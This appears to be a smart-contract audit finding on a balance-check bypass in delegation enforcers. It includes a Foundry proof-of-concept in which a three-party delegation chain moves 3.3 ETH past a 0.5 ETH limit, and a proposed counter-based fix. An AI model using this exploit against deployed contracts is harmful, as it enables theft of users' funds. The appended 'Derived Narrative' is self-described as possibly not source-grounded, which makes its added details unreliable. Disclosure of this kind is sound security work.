---
id: 23421
severity: "High"
---

# TotalBalanceEnforcer validation bypass when mixed with state modifying enforcers

## Description

Total Balance Change Enforcers fail to validate the final balance state when mixed with state-modifying enforcers (such as NativeTokenPaymentEnforcer) in delegation chains.  
The early return bypass in afterAllHook causes total balance enforcers positioned after state-modifying enforcers to skip validation entirely, allowing balance constraints to be violated without detection.  
The vulnerability occurs because Total Balance change enforcers clean up their shared tracker after the first validation, causing subsequent enforcers to hit an early return even when they should validate the modified final state.  

All total balance change enforcers contain this vulnerable pattern:
```solidity
function afterAllHook(...) public override {
    // ... setup code ...
    BalanceTracker memory balanceTracker_ = balanceTracker[hashKey_];
    // @audit this returns early
    if (balanceTracker_.expectedIncrease == 0 && balanceTracker_.expectedDecrease == 0) return;
    // ... validation logic that gets bypassed ...
    delete balanceTracker[hashKey_]; // Cleanup after validation
}
```

Consider a delegation chain with mixed enforcer types affecting the same recipient, as follows:  
Alice: `TotalBalanceChangeEnforcer` (validates net effect)  
Bob: `NativeTokenPaymentEnforcer` (modifies balance during afterAllHook)  
Dave: `TotalBalanceChangeEnforcer` (should validate final state)

Flow:
1. beforeAllHook phase: Alice and Dave's enforcers accumulate balance requirements  
2. Primary transaction executes  
3. afterAllHook phase:  
   • Alice's enforcer: Validates net balance change against accumulated requirements, cleans shared tracker  
   • Bob's enforcer: NativeTokenPaymentEnforcer transfers additional ETH via `delegationManager.redeemDelegations(...)`  

```solidity
// NativeTokenPaymentEnforcer.sol
function afterAllHook(...) public override {
    // ... setup ...
    uint256 balanceBefore_ = recipient_.balance;
    // @audit Transfers ETH during afterAllHook
    delegationManager.redeemDelegations(permissionContexts_, encodedModes_, executionCallDatas_);
    uint256 balanceAfter_ = recipient_.balance;
    require(balanceAfter_ >= balanceBefore_ + amount_,
        "NativeTokenPaymentEnforcer:payment-not-received");
}
```

   • Dave's enforcer: Finds cleaned tracker (`expectedIncrease == 0 && expectedDecrease == 0`) → Early return, no validation  

Dave's enforcer never validates the final balance state that includes Bob's payment transfer.  

Impact: Developers expect each TotalBalanceChangeEnforcer to validate the final balance state, specially when the enforcer order is AFTER a state changing enforcer such as NativeTokenPaymentEnforcer. Early return causes enforcers positioned after state-modifying enforcers to be completely bypassed. This is a possible scenario specially in a batched execution environment where TotalBalanceChangeEnforcer can share state across multiple executions in a single batch.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT AND Apache-2.0
pragma solidity 0.8.23;
import { Implementation, SignatureType } from "./utils/Types.t.sol";
import { BaseTest } from "./utils/BaseTest.t.sol";
import { Execution, Caveat, Delegation } from "../src/utils/Types.sol";
import { Counter } from "./utils/Counter.t.sol";
import { EncoderLib } from "../src/libraries/EncoderLib.sol";
import { MessageHashUtils } from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import { NativeTokenTotalBalanceChangeEnforcer } from
"../src/enforcers/NativeTokenTotalBalanceChangeEnforcer.sol";
import { NativeTokenTransferAmountEnforcer } from
"../src/enforcers/NativeTokenTransferAmountEnforcer.sol";
import { NativeTokenPaymentEnforcer } from "../src/enforcers/NativeTokenPaymentEnforcer.sol";
import { ArgsEqualityCheckEnforcer } from "../src/enforcers/ArgsEqualityCheckEnforcer.sol";
import { IDelegationManager } from "../src/interfaces/IDelegationManager.sol";
import { EIP7702StatelessDeleGator } from "../src/EIP7702/EIP7702StatelessDeleGator.sol";
import "forge-std/Test.sol";
/**
* @title Total Balance Enforcer Vulnerability Test - 3-Chain Scenario
* @notice Demonstrates the vulnerability where TotalBalanceChangeEnforcer gets bypassed
* in a 3-delegation chain: Alice -> Bob -> Dave
* - Alice uses NativeTokenTotalBalanceChangeEnforcer with a recipient as Alice
* - Bob uses NativeTokenPaymentEnforcer that transfers 3 ETH from Alice to a different
* recipient,
* - Dave uses NativeTokenTotalBalanceChangeEnforcer with same recipient as Alice's
* - Dave executes a transaction that decreases Alice's balance by 0.3 ETH
* After Alice's balance check, the balance tracker is cleaned, and even though
* payment was done via Bob's NativeTokenPaymentEnforcer, Dave's check is bypassed.
* afterAllHook moves from root to leaf, Dave's NativeTokenTotalBalanceChangeEnforcer
* is not aware of the payment made by Bob, leading to a successful execution
*/
contract TotalBalanceEnforcer3ChainVulnerabilityTest is BaseTest {
    using MessageHashUtils for bytes32;
    // Enforcers
    NativeTokenTotalBalanceChangeEnforcer public balanceEnforcer;
    NativeTokenPaymentEnforcer public paymentEnforcer;
    NativeTokenTransferAmountEnforcer public transferEnforcer;
    ArgsEqualityCheckEnforcer public argsEnforcer;
    // Test addresses
    address public sharedRecipient;
    address public bobPaymentRecipient;
    constructor() {
        IMPLEMENTATION = Implementation.EIP7702Stateless;
        SIGNATURE_TYPE = SignatureType.EOA;
    }

    function setUp() public override {
        super.setUp();
        // Deploy enforcers
        balanceEnforcer = new NativeTokenTotalBalanceChangeEnforcer();
        argsEnforcer = new ArgsEqualityCheckEnforcer();
        transferEnforcer = new NativeTokenTransferAmountEnforcer();
        paymentEnforcer = new
            NativeTokenPaymentEnforcer(IDelegationManager(address(delegationManager)),
            address(argsEnforcer));
        // Set up test addresses
        sharedRecipient = address(users.alice.deleGator);
        bobPaymentRecipient = address(0x1337);
        // Fund accounts
        vm.deal(address(users.alice.deleGator), 10 ether);
        vm.deal(address(users.bob.deleGator), 10 ether);
        vm.deal(address(users.dave.deleGator), 10 ether);
        vm.deal(sharedRecipient, 5 ether);
        // Fund EntryPoint
        vm.prank(address(users.alice.deleGator));
        entryPoint.depositTo{ value: 1 ether }(address(users.alice.deleGator));
        vm.prank(address(users.bob.deleGator));
        entryPoint.depositTo{ value: 1 ether }(address(users.bob.deleGator));
        vm.prank(address(users.dave.deleGator));
        entryPoint.depositTo{ value: 1 ether }(address(users.dave.deleGator));
    }
    /**
    * @dev Main vulnerability demonstration with 3-delegation chain
    * This test should succeed if vulnerability exists, fail if vulnerability is fixed
    */
    function test_totalBalanceChange_with_PaymentEnforcer() public {
        uint256 initialBalance = sharedRecipient.balance;
        // 1: Create Alice -> Bob delegation
        (Delegation memory aliceToBob, bytes32 aliceToBobHash) = _createAliceToBobDelegation();
        // 2: Create Bob -> Dave delegation with payment enforcement
        (Delegation memory bobToDave, bytes32 bobToDaveHash) =
            _createBobToDaveDelegationWithPayment(aliceToBobHash);
        // 3: Create Dave's delegation
        Delegation memory daveDelegation = _createDaveDelegation(bobToDaveHash);
        // 4: Create execution - transfer 0.3 ETH from Alice's balance
        Execution memory execution = Execution({ target: address(0xBEEF), value: 0.3 ether, callData:
        "" });
        // 5: Set up delegation chain
        Delegation[] memory delegationChain = new Delegation[](3);
        delegationChain[0] = daveDelegation;
        delegationChain[1] = bobToDave;
        delegationChain[2] = aliceToBob;
        uint256 bobInitialBalance = bobPaymentRecipient.balance;
        // 6: Execute the delegation chain
        invokeDelegation_UserOp(users.dave, delegationChain, execution);
        uint256 finalBalance = sharedRecipient.balance;
        uint256 bobFinalBalance = bobPaymentRecipient.balance;
        // 7: Verify the vulnerability
        uint256 totalDecrease = initialBalance - finalBalance;
        uint256 bobPayment = bobFinalBalance - bobInitialBalance;
        // Alice loses 3.3 ETH total (0.3 ETH from execution + 3 ETH from Native Token Payment
        // enforcer),
        // Bob gets 3 ETH
        // EXPECTED BEHAVIOR: transaction should revert before reaching here
        assertEq(totalDecrease, 3.3 ether, "Total decrease should be 3.3 ETH");
        assertEq(bobPayment, 3 ether, "Bob should receive 3 ETH payment");
    }
    function _createAliceToBobDelegation() internal returns (Delegation memory, bytes32) {
        bytes memory terms = abi.encodePacked(
            true, // enforceDecrease
            sharedRecipient,
            uint256(1 ether) // max 1 ETH decrease
        );
        Caveat[] memory caveats = new Caveat[](1);
        caveats[0] = Caveat({ enforcer: address(balanceEnforcer), terms: terms, args: "" });
        Delegation memory delegation = Delegation({
            delegate: address(users.bob.deleGator),
            delegator: address(users.alice.deleGator),
            authority: ROOT_AUTHORITY,
            caveats: caveats,
            salt: 0,
            signature: ""
        });
        delegation = signDelegation(users.alice, delegation);
        bytes32 delegationHash = EncoderLib._getDelegationHash(delegation);
        return (delegation, delegationHash);
    }
    function _createBobToDaveDelegationWithPayment(bytes32 aliceToBobHash) internal returns (Delegation
    memory, bytes32) {
        // Step 1: Create the Bob -> Dave delegation structure first (without payment allowance)
        bytes memory bobPaymentTerms = abi.encodePacked(bobPaymentRecipient, uint256(3 ether));
        Caveat[] memory bobCaveats = new Caveat[](1);
        bobCaveats[0] = Caveat({
            enforcer: address(paymentEnforcer),
            terms: bobPaymentTerms,
            args: "" // Will be filled with allowance delegation
        });
        Delegation memory bobToDave = Delegation({
            delegate: address(users.dave.deleGator),
            delegator: address(users.bob.deleGator),
            authority: aliceToBobHash,
            caveats: bobCaveats,
            salt: 0,
            signature: ""
        });
        // Step 2: Sign to get the delegation hash
        bobToDave = signDelegation(users.bob, bobToDave);
        bytes32 bobToDaveHash = EncoderLib._getDelegationHash(bobToDave);
        // Step 3: Create allowance delegation that uses THIS delegation hash
        Delegation memory paymentAllowance = _createPaymentAllowanceDelegation(bobToDaveHash,
            address(users.dave.deleGator));
        // Step 4: Now set the args with the properly configured allowance delegation
        Delegation[] memory allowanceDelegations = new Delegation[](1);
        allowanceDelegations[0] = paymentAllowance;
        bobToDave.caveats[0].args = abi.encode(allowanceDelegations);
        return (bobToDave, bobToDaveHash);
    }
    function _createPaymentAllowanceDelegation(bytes32 mainDelegationHash, address redeemer) internal
    returns (Delegation memory) {
        // ArgsEqualityCheckEnforcer terms: pre-populated with delegation hash + redeemer
        // This matches the pattern from the working tests
        bytes memory argsEnforcerTerms = abi.encodePacked(mainDelegationHash, redeemer);
        Caveat[] memory caveats = new Caveat[](2);
        // Args enforcer with pre-populated terms
        caveats[0] = Caveat({
            enforcer: address(argsEnforcer),
            terms: argsEnforcerTerms, // Pre-populated with delegation hash + redeemer
            args: "" // Will be populated dynamically by PaymentEnforcer during execution
        });
        // Transfer amount enforcer - allows up to 3 ETH transfer
        caveats[1] = Caveat({ enforcer: address(transferEnforcer), terms: abi.encode(uint256(3 ether)),
        args: "" });
        Delegation memory delegation = Delegation({
            delegate: address(paymentEnforcer),
            delegator: address(users.alice.deleGator), // Alice delegates payment authority from her
            balance,
            authority: ROOT_AUTHORITY,
            caveats: caveats,
            salt: 1,
            signature: ""
        });
        return signDelegation(users.alice, delegation);
    }
    function _createDaveDelegation(bytes32 bobToDaveHash) internal returns (Delegation memory) {
        bytes memory daveTerms = abi.encodePacked(
            true, // enforceDecrease
            sharedRecipient,
            uint256(0.5 ether) // max 0.5 ETH decrease
        );
        Caveat[] memory daveCaveats = new Caveat[](1);
        daveCaveats[0] = Caveat({ enforcer: address(balanceEnforcer), terms: daveTerms, args: "" });
        Delegation memory delegation = Delegation({
            delegate: address(users.dave.deleGator),
            delegator: address(users.dave.deleGator),
            authority: bobToDaveHash,
            caveats: daveCaveats,
            salt: 0,
            signature: ""
        });
        return signDelegation(users.dave, delegation);
    }
}
```

## Recommendation

Recommended Mitigation: Consider adding an `validationsRemaining` in `BalanceTracker` that counts the pending TotalBalanceChangeEnforcer caveats remaining.
```solidity
struct BalanceTracker {
    uint256 balanceBefore;
    uint256 expectedIncrease;
    uint256 expectedDecrease;
    uint256 validationsRemaining; // Countdown to final validation
}

function beforeAllHook(...) {
    // ... existing logic ...
    balanceTracker_.validationsRemaining++;
}

function afterAllHook(...) {
    // ... setup ...
    balanceTracker_.validationsRemaining--;
    // Only validate and cleanup when all total balance change enforcers have been processed
    if (balanceTracker_.validationsRemaining == 0) {
        // Perform validation
        // ... validation logic ...
        delete balanceTracker[hashKey_];
    }
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a validation bypass affecting TotalBalanceChangeEnforcer contracts when they are combined with state‑modifying enforcers such as NativeTokenPaymentEnforcer in a delegation chain. The root cause lies in the afterAllHook implementation of every TotalBalanceChangeEnforcer: it reads a shared BalanceTracker, performs its balance validation, and then deletes the tracker. A guard clause at the start of afterAllHook returns early if both expectedIncrease and expectedDecrease are zero. When the first TotalBalanceChangeEnforcer runs, it clears the tracker, setting those fields to zero. Any subsequent TotalBalanceChangeEnforcer that appears later in the afterAllHook sequence—typically after a state‑changing enforcer—encounters the zeroed tracker, triggers the early return, and skips its validation logic entirely. This means the final balance state, which may have been altered by the intervening state‑modifying enforcer, is never checked against the declared increase/decrease limits.

The exploit scenario proceeds as follows: during the beforeAllHook phase, multiple TotalBalanceChangeEnforcers (e.g., Alice’s and Dave’s) record their expected balance changes in the shared tracker. The primary transaction executes, possibly moving funds. In afterAllHook, Alice’s enforcer validates the net change and deletes the tracker. Next, Bob’s NativeTokenPaymentEnforcer transfers additional ETH to a recipient, changing the balance after the first validation. Finally, Dave’s enforcer sees the cleared tracker, hits the early‑return guard, and performs no validation. As a result, the protocol believes all balance constraints are satisfied even though the total balance has been reduced by both the primary transaction and Bob’s payment.

Impact-wise, developers and protocol designers expect each TotalBalanceChangeEnforcer to enforce the final balance state, especially when enforcers are ordered after state‑changing ones. The bypass allows balance constraints to be violated without detection, leading to scenarios where funds disappear from a user’s account while the transaction succeeds. Users may observe their ETH balance drop unexpectedly, see no revert or error message, and receive no refund. The issue is particularly dangerous in batched execution environments where many enforcers share the same tracker across multiple delegations, but it can also occur in single‑call flows that include both types of enforcers.

The flaw was discovered through manual audit of the afterAllHook logic and confirmed with a proof‑of‑concept test that constructs a three‑step delegation chain (Alice → Bob → Dave). The test demonstrates that after Alice’s balance check, Bob’s payment enforcer moves 3 ETH, and Dave’s subsequent total‑balance enforcer is bypassed, allowing the transaction to complete and the funds to be transferred.

Detecting the problem is non‑trivial because the early‑return condition looks legitimate—it simply avoids duplicate work. However, the shared mutable state across enforcers makes the early return unsafe when multiple enforcers rely on the same tracker.

To remediate, the recommended design adds a validationsRemaining counter to the BalanceTracker. The counter is incremented for each TotalBalanceChangeEnforcer in beforeAllHook and decremented in afterAllHook. Validation and tracker cleanup occur only when the counter reaches zero, guaranteeing that the final balance is validated after all enforcers, including those that modify state, have executed. This change restores the intended accounting guarantees and prevents the bypass.
